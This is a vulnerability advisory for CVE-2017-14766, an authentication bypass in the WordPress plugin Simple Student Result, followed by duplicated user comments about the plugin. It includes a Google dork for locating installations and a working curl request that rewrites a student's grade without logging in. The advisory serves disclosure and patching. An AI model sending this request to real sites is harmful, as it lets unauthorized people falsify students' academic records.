# [CVE-2017-14766 Simple Student Result < 1.6.4 - Auth Bypass](../articles/simple-student-result-auth-bypass.html)

Exploit Title: Simple Student Result < 1.6.4 - Auth Bypass

Google Dork: inurl:wp-content/plugins/simple-student-result

Date: 21-Sep-17

Exploit Author: Benjamin Lim

Vendor Homepage: https://ssr.saadamin.com/

Software Link: https://wordpress.org/plugins/simple-student-result/

Version: < 1.6.4

Tested on: Kali Linux 2.0

CVE : CVE-2017-14766

# 1. Product & Service Introduction:

Simple Student Result is a Wordpress plugin for managing student results. Administrators can create/update/delete results while unauthenticated users can lookup results by providing a student id number. As of now, the plugin has been downloaded 12,000 times and has 700+ active installs.

# 2. Technical Details & Description:

Authentication Bypass vulnerability in the Wordpress Simple Student Result plugin 1.6.3 allows unauthenticated attackers to update or delete student records with knowledge of only the student id number. The fn\_ssr\_add\_st\_submit() function and fn\_ssr\_del\_st\_submit() function in functions.php did not check if the current request is made by an authorized user, thus allowing any unauthenticated user to modify the records.

# 3. Proof of Concept (PoC):

To update student id 123's CGPA to 5.0:

`curl -i -s -k -X 'POST' -H 'User-Agent: Mozilla/5.0' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: http://localhost/wp-admin/admin.php?page=ssr_add_results' --data-binary 'action=ssr_add_st_submit&rid=123&rn=456&stn=john&stfn=smith&stpy=2017&stcgpa=5.00&stsub=Subject+3&stpy2=01011990&stpy3=male&stpy4=address&stpy5=smith&stpy6=extra1&stpy7=extra2&upload_image=' 'https://localhost/wp-admin/admin-ajax.php'`

# 4. Mitigation

Update to version 1.6.4

# 5. Disclosure Timeline

2017/09/20 Vendor contacted

2017/09/20 Vendor responded

2017/09/21 Update released

2017/09/21 Advisory released to the public

“Student Result or employee record” is not including class wise result which is the core need of any school or college.
It is necessary for this plugin to made it perfect with it all features and remove its deficiencies.
This plugin must include a division of result with classes.
Hope the Plugin master will remove its deficiencies soon.
if any person /webmaster have any idea about it to edit the plugin, please help me.
awaited for your answers and good replies.
thanks.

I installed the Plugin in some of my sites. A few weeks later I found that this plugin uses my Wp email ID setting to send the plugin Author an email.
Email from: The Email ID given in my Wp setting

I am not sure if this is legit, but i do not like the way personal details are collected.

“Student Result or employee record” is not including class wise result which is the core need of any school or college.
It is necessary for this plugin to made it perfect with it all features and remove its deficiencies.
This plugin must include a division of result with classes.
Hope the Plugin master will remove its deficiencies soon.
if any person /webmaster have any idea about it to edit the plugin, please help me.
awaited for your answers and good replies.
thanks.
